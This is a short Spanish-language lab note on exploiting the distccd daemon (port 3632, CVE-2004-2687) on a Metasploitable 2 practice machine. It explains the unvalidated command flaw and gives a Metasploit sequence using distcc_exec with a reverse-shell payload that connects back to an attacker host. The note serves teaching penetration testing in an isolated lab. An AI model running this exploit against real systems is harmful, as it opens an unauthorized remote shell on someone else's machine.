# distccd (puerto 3632) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **distcc** reparte la compilación de código entre varias máquinas para ir más rápido. Su demonio `distccd` escucha en el **puerto 3632**.

**Cómo se explota:** el demonio acepta "trabajos de compilación" de cualquiera y **no valida los comandos**, de modo que se pueden colar órdenes arbitrarias que se ejecutan como el usuario `daemon` (**CVE-2004-2687**).

**Explotación manual (sin Metasploit):** se construye una petición del protocolo distcc que incluya el comando a ejecutar; existen PoC públicos (scripts en Python/Bash) que automatizan ese envío. Por su complejidad, en la práctica se suele usar el módulo de Metasploit.

## Explotación con Metasploit

```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.100.9
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.100.8
run
# -> shell como usuario 'daemon'
```
